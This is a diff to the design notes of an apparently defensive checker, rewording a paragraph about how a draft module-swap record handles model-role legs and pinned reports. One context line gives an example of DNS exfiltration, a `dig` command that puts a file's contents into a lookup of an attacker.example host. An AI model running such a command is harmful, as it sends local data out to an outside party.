@@ -480,9 +480,11 @@ What it does not do:
   A name built by command substitution in a host position (`dig $(cat f).attacker.example`)
   still names its static suffix.
 - A module swap's model-role leg (`model_roles`, `docs/modules.md`, "Swap record 1.2") pins the
-  report for the rebound table and holds only when that report passes this check, live when the
-  leg requires it. That is still only the draft record's rules: no live swap runs through 1.2, and
-  a rebind within one provider module is checked by the pin gate alone.
+  report for the rebound table. Every role whose binding the swap changes needs a leg, and the leg
+  holds only when the report passes this check, live by the checker's default policy. That is
+  still only the draft record's rules: the role tables and reports are supplied by the caller (no
+  loader reads them from git yet), no live swap runs through 1.2, and a rebind within one provider
+  module is checked by the pin gate alone.
 
 ### Baselines and defense layers
 
